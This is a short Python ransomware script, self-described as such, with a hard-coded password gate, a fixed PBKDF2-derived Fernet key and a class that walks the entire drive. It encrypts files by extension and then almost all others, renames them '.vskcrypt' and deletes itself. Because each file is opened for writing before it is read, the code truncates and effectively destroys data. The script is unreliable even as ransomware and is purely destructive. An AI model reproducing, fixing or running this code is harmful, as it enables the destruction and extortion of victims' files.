import os, base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

#Secutiry Validation
passwd = 's3cr3t'
passwd_input = input('Password: ')
while passwd_input != passwd:
    passwd_input = input('Password: ')

#Ransonware Structure
class duckCrypt:
    def __init__(self):
        self.ext_files = ['txt','pdf','xls','pptx','html','dll','xml','js','jar','sql','db', 'rar', 'zip', 'exe', '7z', 'tar', 'log']
        self.crypt = None

    def generateKey(self):
        self.crypt = Fernet(base64.urlsafe_b64encode(PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=b'\xba\x89\x7f\xc3\x8e\xa3VJ\xb0\x88\xadL\xf4\x1ey8',iterations=100000).derive(b"insert_your_key")))

    def encryptFiles(self):
        self.a = os.getcwd().split(":")[0]+":\\" or '/'

        for path, dnames, fnames in os.walk(self.a):
            for x in os.listdir(path):
                try:
                    for ext in self.ext_files:
                        if (ext in x) and (not 'py' in x) and (not 'vskcrypt' in x):
                            try:
                                with open(path+"\\"+x, 'rb') as r_file:
                                    with open(path+"\\"+x, "wb") as w_file:
                                        w_file.write(self.crypt.encrypt(r_file.read()))
                                        print('Encrypted Extension:',path+"\\"+x)
                                os.rename(path+"\\"+x, path+'\\'+x+'.vskcrypt')
                            except:
                                pass
                except:
                    pass
        for path, dnames, fnames in os.walk(self.a):
            for x in os.listdir(path):
                try:
                    for ext in self.ext_files:
                        if (not ext in x) and (not 'py' in x) and (not 'vskcrypt' in x):
                            try:
                                with open(path+"\\"+x, 'rb') as r_file:
                                    with open(path+"\\"+x, "wb") as w_file:
                                        w_file.write(self.crypt.encrypt(r_file.read()))
                                        print('Encrypted Aleatory:',path+"\\"+x)
                                os.rename(path+"\\"+x, path+'\\'+x+'.vskcrypt')
                            except:
                                pass
                except:
                    pass

        os.remove('ransonFernet.py')

def main():
    dc = duckCrypt()
    dc.generateKey()
    dc.encryptFiles()

if __name__ == '__main__':
    main()